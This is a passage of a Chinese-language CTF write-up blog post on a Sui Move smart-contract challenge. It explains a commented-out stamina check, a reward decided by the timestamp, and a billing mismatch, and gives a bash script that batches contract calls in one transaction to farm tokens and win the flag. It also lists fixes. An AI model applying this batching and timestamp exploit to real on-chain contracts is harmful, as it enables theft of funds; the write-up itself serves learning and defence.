<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="DudeGuuud" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  <meta name="description" content="&#34;the quieter you become, the more you are able to hear&#34;" />
  
  
  
  <title>
    
      SUI MOVE CTF 2025 (1-4) Write Up 
      
      
      |
    
     Dude&#39;s Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" />
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/rss.xml" title="Dude's Blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">DudeGuuud</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">SUI MOVE CTF 2025 (1-4) Write Up</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2025-08-05 16:32:21
        </span>
        
      </div>
      <div class="markdown-body">
        <h1 id="Sui-Move-CTF-2025-1-4-WriteUp"><a href="#Sui-Move-CTF-2025-1-4-WriteUp" class="headerlink" title="Sui Move CTF 2025(1-4) WriteUp"></a>Sui Move CTF 2025(1-4) WriteUp</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文档包含了四道Sui Move CTF挑战的完整解题过程，涵盖了智能合约漏洞利用、算法分析、密码学攻击和路径搜索等多个技术领域。每个题目都保留了完整的技术细节、代码实现和解题过程。</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
<li><a href="#1-%E5%86%92%E9%99%A9%E6%B8%B8%E6%88%8F">冒险游戏 - 智能合约漏洞利用</a></li>
<li><a href="#2-%E5%BC%BA%E7%9B%97%E6%B8%B8%E6%88%8F">强盗游戏 - 动态规划算法</a></li>
<li><a href="#3-%E6%81%A2%E5%A4%8D%E5%AF%86%E9%92%A5">恢复密钥 - 格理论密码学</a></li>
<li><a href="#4-%E8%BF%B7%E5%AE%AB%E6%B8%B8%E6%88%8F">迷宫游戏 - 路径搜索算法</a></li>
</ol>
<hr>
<h1 id="1-冒险游戏"><a href="#1-冒险游戏" class="headerlink" title="1. 冒险游戏"></a>1. 冒险游戏</h1><h2 id="挑战概述"><a href="#挑战概述" class="headerlink" title="挑战概述"></a>挑战概述</h2><p>这是一个基于Sui Move智能合约的CTF挑战，目标是通过利用合约漏洞获取Flag。挑战涉及一个冒险游戏，玩家需要控制英雄击败怪物来获得token，最终购买宝箱获取Flag。</p>
<h2 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h2><h3 id="核心合约结构"><a href="#核心合约结构" class="headerlink" title="核心合约结构"></a>核心合约结构</h3><p>挑战包含三个主要模块：</p>
<ul>
<li><code>adventure.move</code> - 主要游戏逻辑</li>
<li><code>hero.move</code> - 英雄系统</li>
<li><code>inventory.move</code> - 物品和Flag系统</li>
</ul>
<h3 id="关键漏洞发现"><a href="#关键漏洞发现" class="headerlink" title="关键漏洞发现"></a>关键漏洞发现</h3><h4 id="1-体力消耗漏洞"><a href="#1-体力消耗漏洞" class="headerlink" title="1. 体力消耗漏洞"></a>1. 体力消耗漏洞</h4><p>在 <code>slay_boar_king</code> 函数中发现关键漏洞：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">entry fun <span class="token function">slay_boar_king</span><span class="token punctuation">(</span>clock<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token class-name">Clock</span><span class="token punctuation">,</span> usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> hero<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Hero</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// ...</span>
    <span class="token comment">//hero::decrease_stamina(hero, 2);  // 这行被注释掉了！</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>影响</strong>: 击败野猪王不消耗体力，可以无限次攻击。</p>
<h4 id="2-时间戳依赖漏洞"><a href="#2-时间戳依赖漏洞" class="headerlink" title="2. 时间戳依赖漏洞"></a>2. 时间戳依赖漏洞</h4><p>token奖励基于时间戳：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token punctuation">(</span>fight_result <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>d100 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 增加5个token</span>
        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 减少5个token</span>
        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>影响</strong>: 只有当 <code>timestamp % 3 == 1</code> 时才能获得token奖励。</p>
<h4 id="3-计费错误漏洞"><a href="#3-计费错误漏洞" class="headerlink" title="3. 计费错误漏洞"></a>3. 计费错误漏洞</h4><p>在 <code>buy_box</code> 函数中：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token operator">*</span>current_balance <span class="token operator">>=</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token constant">ERROR_NO_MONEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 检查200</span>
<span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token comment">// 但只扣除100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>影响</strong>: 检查需要200个token但实际只扣除100个。</p>
<h2 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h2><h3 id="阶段1-英雄战斗力提升"><a href="#阶段1-英雄战斗力提升" class="headerlink" title="阶段1: 英雄战斗力提升"></a>阶段1: 英雄战斗力提升</h3><p>发现英雄初始属性不足以击败野猪王：</p>
<ul>
<li>初始strength: 10</li>
<li>野猪王defense: 10-15</li>
</ul>
<p><strong>解决方案</strong>: 升级英雄系统</p>
<ul>
<li>击败普通野猪获得经验（每次+10经验）</li>
<li>100经验可升级，升级后strength增加30点</li>
</ul>
<h3 id="阶段2-PTB时间戳攻击"><a href="#阶段2-PTB时间戳攻击" class="headerlink" title="阶段2: PTB时间戳攻击"></a>阶段2: PTB时间戳攻击</h3><p>利用Programmable Transaction Block (PTB)确保所有操作使用相同时间戳：</p>
<ol>
<li>等待有利时间戳（<code>timestamp % 3 == 1</code>）</li>
<li>在单个PTB中执行20次 <code>slay_boar_king</code>调用</li>
<li>每次成功+5 token，从100增加到200</li>
</ol>
<h3 id="阶段3-购买宝箱获取Flag"><a href="#阶段3-购买宝箱获取Flag" class="headerlink" title="阶段3: 购买宝箱获取Flag"></a>阶段3: 购买宝箱获取Flag</h3><ol>
<li>利用计费错误购买宝箱（检查200但只扣100）</li>
<li>调用 <code>get_flag</code>函数获取Flag事件</li>
</ol>
<h2 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h2><h3 id="英雄升级脚本"><a href="#英雄升级脚本" class="headerlink" title="英雄升级脚本"></a>英雄升级脚本</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 击败30只普通野猪获得经验</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> slay_boar <span class="token punctuation">\</span>
        <span class="token parameter variable">--args</span> <span class="token variable">$HERO_ID</span> --gas-budget <span class="token number">20000000</span>
<span class="token keyword">done</span>

<span class="token comment"># 升级英雄</span>
sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> hero <span class="token parameter variable">--function</span> level_up <span class="token punctuation">\</span>
    <span class="token parameter variable">--args</span> <span class="token variable">$HERO_ID</span> --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="PTB批量攻击脚本"><a href="#PTB批量攻击脚本" class="headerlink" title="PTB批量攻击脚本"></a>PTB批量攻击脚本</h3><p>核心攻击脚本 <code>ptb_batch_attack.sh</code>：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># 合约配置</span>
<span class="token assign-left variable">PACKAGE_ID</span><span class="token operator">=</span><span class="token string">"0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d"</span>
<span class="token assign-left variable">HERO_ID</span><span class="token operator">=</span><span class="token string">"0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134"</span>
<span class="token assign-left variable">USERS_TOKEN_AMOUNT_ID</span><span class="token operator">=</span><span class="token string">"0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45"</span>
<span class="token assign-left variable">CLOCK_ID</span><span class="token operator">=</span><span class="token string">"0x6"</span>

<span class="token comment"># PTB攻击函数</span>
<span class="token function-name function">execute_ptb_attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin class-name">local</span> <span class="token assign-left variable">batch_size</span><span class="token operator">=</span><span class="token variable">$1</span>
    <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"sui client ptb"</span>
  
    <span class="token comment"># 构建20次slay_boar_king调用</span>
    <span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>batch_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
        <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$PTB_CMD</span> --move-call <span class="token variable">$PACKAGE_ID</span>::adventure::slay_boar_king <span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\&quot;">\"</span> @<span class="token variable">$CLOCK_ID</span> @<span class="token variable">$USERS_TOKEN_AMOUNT_ID</span> @<span class="token variable">$HERO_ID</span>"</span>
    <span class="token keyword">done</span>
  
    <span class="token assign-left variable">PTB_CMD</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$PTB_CMD</span> --gas-budget 100000000"</span>
    <span class="token assign-left variable">RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">eval</span> $PTB_CMD <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>
  
    <span class="token comment"># 检查Amount事件</span>
    <span class="token keyword">if</span> <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"Amount"</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token assign-left variable">AMOUNT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-A</span> <span class="token number">5</span> <span class="token string">"Amount"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"amount"</span> <span class="token operator">|</span> <span class="token function">tail</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[0-9]\+'</span><span class="token variable">)</span></span>
        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$AMOUNT</span>"</span> <span class="token parameter variable">-ge</span> <span class="token number">200</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
            <span class="token builtin class-name">return</span> <span class="token number">0</span>
        <span class="token keyword">fi</span>
    <span class="token keyword">fi</span>
    <span class="token builtin class-name">return</span> <span class="token number">1</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 主攻击循环</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">attempt</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">100</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token assign-left variable">TIMESTAMP</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span>
    <span class="token assign-left variable">REMAINDER</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>TIMESTAMP <span class="token operator">%</span> <span class="token number">3</span><span class="token variable">))</span></span>
  
    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$REMAINDER</span> <span class="token parameter variable">-eq</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"🎯 发现有利时间戳! 执行PTB攻击!"</span>
  
        <span class="token keyword">if</span> execute_ptb_attack <span class="token number">20</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
            <span class="token comment"># 购买宝箱</span>
            <span class="token assign-left variable">BUY_RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>sui client call <span class="token parameter variable">--package</span> $PACKAGE_ID <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> buy_box <span class="token parameter variable">--args</span> $USERS_TOKEN_AMOUNT_ID --gas-budget <span class="token number">20000000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>
  
            <span class="token comment"># 提取宝箱ID并获取Flag</span>
            <span class="token assign-left variable">TREASURY_BOX_ID</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$BUY_RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-A</span> <span class="token number">10</span> <span class="token string">"Created Objects"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ID:"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'0x[a-f0-9]\&#123;64\&#125;'</span><span class="token variable">)</span></span>
  
            <span class="token assign-left variable">FLAG_RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>sui client call <span class="token parameter variable">--package</span> $PACKAGE_ID <span class="token parameter variable">--module</span> inventory <span class="token parameter variable">--function</span> get_flag <span class="token parameter variable">--args</span> $TREASURY_BOX_ID --gas-budget <span class="token number">20000000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>
  
            <span class="token assign-left variable">FLAG_TX_HASH</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$FLAG_RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Transaction Digest:"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[A-Za-z0-9]\&#123;44\&#125;'</span><span class="token variable">)</span></span>
            <span class="token builtin class-name">echo</span> <span class="token string">"🏁 Flag交易哈希: <span class="token variable">$FLAG_TX_HASH</span>"</span>
            <span class="token builtin class-name">exit</span> <span class="token number">0</span>
        <span class="token keyword">fi</span>
    <span class="token keyword">fi</span>
  
    <span class="token comment"># 重置余额并等待下一次机会</span>
    sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> init_balances <span class="token parameter variable">--args</span> <span class="token variable">$USERS_TOKEN_AMOUNT_ID</span> --gas-budget <span class="token number">10000000</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
    <span class="token function">sleep</span> <span class="token number">1</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="攻击执行过程"><a href="#攻击执行过程" class="headerlink" title="攻击执行过程"></a>攻击执行过程</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 部署合约获取Package ID</span>
Package ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d
Hero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134
UsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-英雄升级"><a href="#2-英雄升级" class="headerlink" title="2. 英雄升级"></a>2. 英雄升级</h3><ul>
<li>击败30只普通野猪获得160点经验</li>
<li>升级英雄：strength 10→40, defense 5→20, hp 100→200</li>
</ul>
<h3 id="3-PTB攻击"><a href="#3-PTB攻击" class="headerlink" title="3. PTB攻击"></a>3. PTB攻击</h3><ul>
<li>等待时间戳余数为1的有利时机</li>
<li>执行20次批量 <code>slay_boar_king</code>调用</li>
<li>成功从100 token增加到200 token</li>
</ul>
<h3 id="4-获取Flag"><a href="#4-获取Flag" class="headerlink" title="4. 获取Flag"></a>4. 获取Flag</h3><ul>
<li>购买宝箱（利用计费错误）</li>
<li>调用 <code>get_flag</code>获取Flag事件</li>
</ul>
<h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><strong>成功获取Flag交易哈希</strong>: <code>23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs</code></p>
<h2 id="技术要点总结"><a href="#技术要点总结" class="headerlink" title="技术要点总结"></a>技术要点总结</h2><ol>
<li><strong>漏洞组合利用</strong>: 体力消耗漏洞 + 时间戳依赖 + 计费错误</li>
<li><strong>PTB时间戳同步</strong>: 确保批量操作使用相同时间戳</li>
<li><strong>英雄升级机制</strong>: 发现并利用升级系统提升战斗力</li>
<li><strong>概率攻击优化</strong>: 从1&#x2F;3成功率提升到100%成功率</li>
</ol>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><ol>
<li><strong>修复体力消耗</strong>: 取消注释 <code>hero::decrease_stamina(hero, 2)</code></li>
<li><strong>移除时间戳依赖</strong>: 使用安全的随机数生成</li>
<li><strong>修复计费错误</strong>: 统一检查和扣除金额</li>
<li><strong>限制批量操作</strong>: 对PTB中的重复调用进行限制</li>
</ol>
<p>这次攻击展示了智能合约中多个看似无关的小漏洞如何被巧妙组合，形成完整的攻击链。</p>
<h2 id="详细技术分析"><a href="#详细技术分析" class="headerlink" title="详细技术分析"></a>详细技术分析</h2><h3 id="时间戳攻击原理"><a href="#时间戳攻击原理" class="headerlink" title="时间戳攻击原理"></a>时间戳攻击原理</h3><p>Sui区块链中，同一个PTB内的所有操作共享相同的时间戳。这个特性被用来绕过随机性：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>通过在shell中检查时间戳并在有利时机立即执行PTB，可以确保所有20次调用都获得奖励。</p>
<h3 id="PTB构造技巧"><a href="#PTB构造技巧" class="headerlink" title="PTB构造技巧"></a>PTB构造技巧</h3><p>关键在于正确构造PTB命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client ptb <span class="token punctuation">\</span>
  --move-call package::module::function <span class="token string">""</span> @arg1 @arg2 @arg3 <span class="token punctuation">\</span>
  --move-call package::module::function <span class="token string">""</span> @arg1 @arg2 @arg3 <span class="token punctuation">\</span>
  <span class="token punctuation">..</span>. <span class="token punctuation">(</span>重复20次<span class="token punctuation">)</span>
  --gas-budget <span class="token number">100000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>每个 <code>--move-call</code>代表一次函数调用，所有调用在同一个交易中执行。</p>
<h3 id="英雄升级数值分析"><a href="#英雄升级数值分析" class="headerlink" title="英雄升级数值分析"></a>英雄升级数值分析</h3><p>升级前后战斗力对比：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>升级前</th>
<th>升级后</th>
<th>提升</th>
</tr>
</thead>
<tbody><tr>
<td>Level</td>
<td>1</td>
<td>2</td>
<td>+1</td>
</tr>
<tr>
<td>Strength</td>
<td>10</td>
<td>40</td>
<td>+30</td>
</tr>
<tr>
<td>Defense</td>
<td>5</td>
<td>20</td>
<td>+15</td>
</tr>
<tr>
<td>HP</td>
<td>100</td>
<td>200</td>
<td>+100</td>
</tr>
</tbody></table>
<p>野猪王属性范围：</p>
<ul>
<li>HP: 180-220</li>
<li>Strength: 20-25</li>
<li>Defense: 10-15</li>
</ul>
<p>升级后英雄的40点攻击力可以轻松突破野猪王的10-15防御。</p>
<h2 id="攻击时间线"><a href="#攻击时间线" class="headerlink" title="攻击时间线"></a>攻击时间线</h2><ol>
<li><strong>00:00</strong> - 分析合约代码，发现多个漏洞</li>
<li><strong>00:30</strong> - 尝试直接攻击野猪王，发现战斗力不足</li>
<li><strong>01:00</strong> - 研究英雄升级机制</li>
<li><strong>01:30</strong> - 击败30只普通野猪，升级英雄</li>
<li><strong>02:00</strong> - 开发PTB攻击脚本</li>
<li><strong>02:30</strong> - 成功执行攻击，获取Flag</li>
</ol>
<h2 id="关键代码片段"><a href="#关键代码片段" class="headerlink" title="关键代码片段"></a>关键代码片段</h2><h3 id="漏洞代码1-体力消耗被注释"><a href="#漏洞代码1-体力消耗被注释" class="headerlink" title="漏洞代码1: 体力消耗被注释"></a>漏洞代码1: 体力消耗被注释</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">entry fun <span class="token function">slay_boar_king</span><span class="token punctuation">(</span>clock<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token class-name">Clock</span><span class="token punctuation">,</span> usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> hero<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Hero</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> sender <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">hero<span class="token punctuation">::</span></span><span class="token function">stamina</span><span class="token punctuation">(</span>hero<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">EHERO_TIRED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
    <span class="token keyword">let</span> fight_result <span class="token operator">=</span> fight_monster<span class="token operator">&lt;</span><span class="token class-name">BoarKing</span><span class="token operator">></span><span class="token punctuation">(</span>hero<span class="token punctuation">,</span> <span class="token operator">&amp;</span>boar<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//hero::decrease_stamina(hero, 2);  // ← 关键漏洞：被注释掉</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="漏洞代码2-时间戳依赖"><a href="#漏洞代码2-时间戳依赖" class="headerlink" title="漏洞代码2: 时间戳依赖"></a>漏洞代码2: 时间戳依赖</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token punctuation">(</span>fight_result <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span>
